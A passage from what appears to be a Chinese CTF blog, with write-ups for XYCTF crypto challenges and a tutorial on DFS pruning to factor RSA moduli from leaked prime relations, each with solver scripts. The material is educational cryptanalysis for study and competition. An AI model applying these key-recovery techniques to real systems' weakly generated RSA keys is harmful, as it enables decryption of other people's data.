class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&quot;XYCTF&#123;&quot;</span>).strip(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">p = <span class="number">1127236854942215744482170859284245684922507818478439319428888584898927520579579027</span></span><br><span class="line">g = Complex(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"><span class="comment">#complex_pow(g, x, p)==5699996596230726507553778181714315375600519769517892864468100565238657988087817 + 198037503897625840198829901785272602849546728822078622977599179234202360717671908i</span></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做的时候一直卡在复数转实数上，想到了共轭复数但是没有去仔细研究。</p>
<p>赛后看wp知道了定义<img src="/pic/XYCTF-crypto/image-20240428191957162-1719079099042.png" alt="image-20240428191957162"></p>
<p>这样题目中的g和c都可以通过实部和虚部平方相加的方式转为实数再进行普通的dlp求解 </p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">p=<span class="number">1127236854942215744482170859284245684922507818478439319428888584898927520579579027</span></span><br><span class="line">g=<span class="number">58</span></span><br><span class="line">c=(<span class="number">5699996596230726507553778181714315375600519769517892864468100565238657988087817</span>**<span class="number">2</span>)+(<span class="number">198037503897625840198829901785272602849546728822078622977599179234202360717671908</span>**<span class="number">2</span>)</span><br><span class="line">flag=discrete_log(p,c,g)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>

<h1 id="Complex-rsa"><a href="#Complex-rsa" class="headerlink" title="Complex_rsa"></a>Complex_rsa</h1><p>与上题类似，也是一个复数域上的问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">key = getRandomNBitInteger(m.bit_length())</span><br><span class="line">c = m ^ key</span><br><span class="line">com = Complex(key, c)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">9</span></span><br><span class="line">enc = complex_pow(com, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="built_in">print</span>(Complex(p, q) * Complex(p, q))</span><br><span class="line"><span class="comment"># 66350931528185981323649477263900844564494528747802437244889229343520648562164950914433406604580038018765783183569276743239888668912948977370163046257917321742455772852779551569446155827368453262479370103326286297164105599131090881306108546341785251895116423206455175290083968296281375908109039893280371271943 + 65266730684129269806656018828265187384002656633231286337130178390517924611751697965395744944541329793503617856896706439809241745206839328124348693486741656130890593895436661857688522977866438805549144904296596887218275440542852887148071837153436265722614658566275517205322945316112048487893204059562830581004i</span></span><br><span class="line"><span class="comment"># -28814875173103880290298835537218644402443395484370652510062722255203946330565951328874411874019897676900075613671629765922970689802650462822117767927082712245512492082864958877932682404829188622269636302484189627580600076246836248427780151681898051243380477561480415972565859837597822263289141887833338111120 + 235362412848885579543400940934854106052672292040465052424316433330114813432317923674803623227280862945857543620663672974955235166884830751834386990766053503640556408758413592161122945636548462064584183165189050320898315823173824074873376450569212651128285746330837777597290934043912373820690250920839961482862i</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>已知Complex(p, q) * Complex(p, q)，明显通过该式子求得p，q，同时在复数域中phi&#x3D;（p^2^-1)（q^2^-1）,按照一般的思路求e关于phi的逆元即可得到结果，但对于这道题有</p>
<p>gcd(e，p^2^-1)&#x3D;gcd(e,q^2^-1)&#x3D;3,所以逆元不存在。</p>
<h1 id="反方向的密码-相思"><a href="#反方向的密码-相思" class="headerlink" title="反方向的密码 相思"></a>反方向的密码 相思</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># c=120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># n=143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"><span class="comment"># m=1252734178929444996144243699830218307941015280272407466795285950142407741311749512416560379489724065530428888294520405996969464281930538422811270188075397985</span></span><br></pre></td></tr></table></figure>

<p><img src="/pic/XYCTF-crypto/202406230159863.png"></p>
<p>其实就是将sha256看做256进制，256^32^代表将m作为高位拼接到32字节的h之前，其实与二进制移位乘2^n^道理一样。最后copper求小根。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> trange(<span class="number">20</span>,<span class="number">50</span>):</span><br><span class="line">    suffix = bytes_to_long(<span class="built_in">hash</span>(<span class="built_in">str</span>(length)))</span><br><span class="line">    f = (<span class="number">256</span>^<span class="number">32</span>*x + suffix)^<span class="number">3</span> - c</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res = f.small_roots(X=<span class="number">256</span>^length,beta=<span class="number">1</span>,epsilon=<span class="number">0.05</span>)</span><br><span class="line">    <span class="keyword">if</span>(res != []):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>剪枝相关</title>
    <url>/2024/07/17/%E5%89%AA%E6%9E%9D%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>比赛时遇到了挺多剪枝相关的题，但是只会套板子，趁着有时间学习总结一下</p>
<span id="more"></span>

<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>DFS之剪枝与优化指的是在执行深度优先搜索(DFS, Depth-First Search)时，采取的一系列策略来减少搜索空间，避免无效计算，从而加速找到问题的解。剪枝是指在搜索过程中，当遇到某些条件不符合解的要求或者可以预判后续搜索不会产生有效解时，直接放弃这条搜索路径，这一过程称为剪枝。优化则是指通过调整搜索策略、顺序等，提高搜索效率。</p>
<h1 id="题目（收集ing……"><a href="#题目（收集ing……" class="headerlink" title="题目（收集ing……)"></a>题目（收集ing……)</h1><h2 id="首尾剪枝"><a href="#首尾剪枝" class="headerlink" title="首尾剪枝"></a>首尾剪枝</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p ^ _q)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">47761879279815109356923025519387920397647575481870870315845640832106405230526</span></span><br><span class="line"><span class="string">10310021142875344535823132048350287610122830618624222175188882916320750885684668357543070611134424902255744858233485983896082731376191044874283981089774677</span></span><br><span class="line"><span class="string">999963120986258459742830847940927620860107164857685447047839375819380831715400110131705491405902374029088041611909274341590559275004502111124764419485191</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>题目给出p 与 q 的反方向二进制的异或值，根据异或操作的特性，可知如果当前需搜索的最高位为”1”，则对应两种可能：p该位为1，q对应低位为0；p该位为0，q对应低位为1。对应的剪枝条件为</p>
<p>1.将p、q未搜索到的位全填0，乘积应小于n<br>2.将p、q未搜索到的位全填1，乘积应大于n<br>3.p、q 低 k 位乘积再取低 k 位，应与 n 的低 k 位相同</p>
<p>首先定义搜索函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph,qh,pl,ql</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(ph)</span><br><span class="line">    tmp0 = ph + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;0&quot;</span> + pl</span><br><span class="line">    tmp1 = ph + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;1&quot;</span> + pl</span><br><span class="line">    tmq0 = qh + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;0&quot;</span> + ql</span><br><span class="line">    tmq1 = qh + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;1&quot;</span> + ql</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(tmp0,<span class="number">2</span>)*<span class="built_in">int</span>(tmq0,<span class="number">2</span>) &gt; n):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(tmp1,<span class="number">2</span>)*<span class="built_in">int</span>(tmq1,<span class="number">2</span>) &lt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(pl,<span class="number">2</span>)*<span class="built_in">int</span>(ql,<span class="number">2</span>) % (<span class="number">2</span>**(l-<span class="number">1</span>)) != n % (<span class="number">2</span>**(l-<span class="number">1</span>))):</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>根据条件进行剪枝操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(l == <span class="number">128</span>):</span><br><span class="line">        pp0 = <span class="built_in">int</span>(tmp0,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span>(n % pp0 == <span class="number">0</span>):</span><br><span class="line">            pf = pp0</span><br><span class="line">            qf = n//pp0</span><br><span class="line">            phi = (pf-<span class="number">1</span>)*(qf-<span class="number">1</span>)</span><br><span class="line">            d = inverse(e,phi)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br></pre></td></tr></table></figure>

<h2 id="2-名称待定"><a href="#2-名称待定" class="headerlink" title="2(名称待定)"></a>2(名称待定)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myGetPrime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = getRandomNBitInteger(<span class="number">1024</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">1024</span>) - <span class="number">1</span>)//<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(x):</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">p = myGetPrime()</span><br><span class="line">q = myGetPrime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">m = bytes_to_long(message.read())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;superstitious-2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\nc = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先关注一下((1 &lt;&lt; 1024) - 1)&#x2F;&#x2F;3这个数，发现是10101010……01，适合剪枝，根据逻辑与操作的特点：全一为一，有零为零。且p*q的低位等于n的低位.</p>
<p>首先知道p和q末尾必是01，再逐步从后向前进行剪枝，又因为只有奇数位有1，每次可以操作两位，用01和00搭配可能性即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">550201148354755741271315125069984668413716061796183554308291706476140978529375848655819753667593579308959498512392008673328929157581219035186964125404507736120739215348759388064536447663960474781494820693212364523703341226714116205457869455356277737202439784607342540447463472816215050993875701429638490180199815506308698408730404219351173549572700738532419937183041379726568197333982735249868511771330859806268212026233242635600099895587053175025078998220267857284923478523586874031245098448804533507730432495577952519158565255345194711612376226297640371430160273971165373431548882970946865209008499974693758670929</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12785320910832143088122342957660384847883123024416376075086619647021969680401296902000223390419402987207599720081750892719692986089224687862496368722454869160470101334513312534671470957897816352186267364039566768347665078311312979099890672319750445450996125821736515659224070277556345919426352317110605563901547710417861311613471239486750428623317970117574821881877688142593093266784366282508041153548993479036139219677970329934829870592931817113498603787339747542136956697591131562660228145606363369396262955676629503331736406313979079546532031753085902491581634604928829965989997727970438591537519511620204387132</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findp</span>(<span class="params">p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">1024</span>:</span><br><span class="line">        pp = <span class="built_in">int</span>(p, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> n % pp == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(pp)</span><br><span class="line">            <span class="built_in">print</span>(n // pp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = <span class="built_in">len</span>(p)</span><br><span class="line">        pp = <span class="built_in">int</span>(p, <span class="number">2</span>)</span><br><span class="line">        qq = <span class="built_in">int</span>(q, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> pp * qq % (<span class="number">2</span>**l) == n % (<span class="number">2</span>**l):</span><br><span class="line">            findp(<span class="string">&quot;01&quot;</span> + p, <span class="string">&quot;01&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;01&quot;</span> + p, <span class="string">&quot;00&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;00&quot;</span> + p, <span class="string">&quot;01&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;00&quot;</span> + p, <span class="string">&quot;00&quot;</span> + q)</span><br><span class="line"></span><br><span class="line">findp(<span class="string">&#x27;01&#x27;</span>,<span class="string">&#x27;01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">11466867937506443031079406557463511000236825156042986330491372554263065048494616429572254582549332374593524344514321333368747919034845244563606383834070804967345648840205613712911286600828703809116499141392947298788689558078395325755136448592591616295144118450804581480471547613492025968699740517273286296657</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<h2 id="3，已知p-q"><a href="#3，已知p-q" class="headerlink" title="3，已知p^q"></a>3，已知p^q</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">xor = p^q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;xor = <span class="subst">&#123;xor&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 81273634095521392491945168120330007101677085824054016784875224305683560308213</span></span><br><span class="line"><span class="comment">#xor = 55012774068906519160740720236510369652</span></span><br></pre></td></tr></table></figure>

<p>​        搜索条件：</p>
<ul>
<li><p>从低位向高位搜索</p>
</li>
<li><p>若xor当前位为1，则可能为两种情况：p为1，q为0 或者 p为0，q为1；反之xor当前位为0，则p为1，q为1 或者 p为0，q为0.</p>
<p>剪枝条件：</p>
<ul>
<li>将p和q剩下位全部填充为1，需要满足 p*q &gt; n</li>
<li>将p和q剩下位全部填充为0，需要满足 p*q &lt; n</li>
</ul>
</li>
</ul>
<p>其实算是第一道题的简化版，当p*q&#x3D;n或者n mod p&#x3D;0时结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">81273634095521392491945168120330007101677085824054016784875224305683560308213</span></span><br><span class="line">xor = <span class="number">55012774068906519160740720236510369652</span></span><br><span class="line">pbits = <span class="number">128</span></span><br><span class="line">ph = <span class="string">&#x27;&#x27;</span></span><br><span class="line">qh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">xor = <span class="built_in">str</span>(<span class="built_in">bin</span>(xor)[<span class="number">2</span>:]).zfill(pbits)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph,qh</span>):</span><br><span class="line">    l0 = <span class="built_in">len</span>(ph)</span><br><span class="line">    l1 = <span class="built_in">len</span>(qh)</span><br><span class="line">    tmp0 = ph + <span class="string">&#x27;0&#x27;</span> * (pbits-l0)</span><br><span class="line">    tmp1 = ph + <span class="string">&#x27;1&#x27;</span> * (pbits-l0)</span><br><span class="line">    tmq0 = qh + <span class="string">&#x27;0&#x27;</span> * (pbits-l1)</span><br><span class="line">    tmq1 = qh + <span class="string">&#x27;1&#x27;</span> * (pbits-l1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(tmp0,<span class="number">2</span>) * <span class="built_in">int</span>(tmq0,<span class="number">2</span>) &gt; n:<span class="comment">#剪枝条件1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(tmp1,<span class="number">2</span>) * <span class="built_in">int</span>(tmq1,<span class="number">2</span>) &lt; n:<span class="comment">#剪枝条件2</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> l0 == pbits:<span class="comment">#结束条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(ph,<span class="number">2</span>) * <span class="built_in">int</span>(qh,<span class="number">2</span>) == n:</span><br><span class="line">            <span class="built_in">print</span>(<span 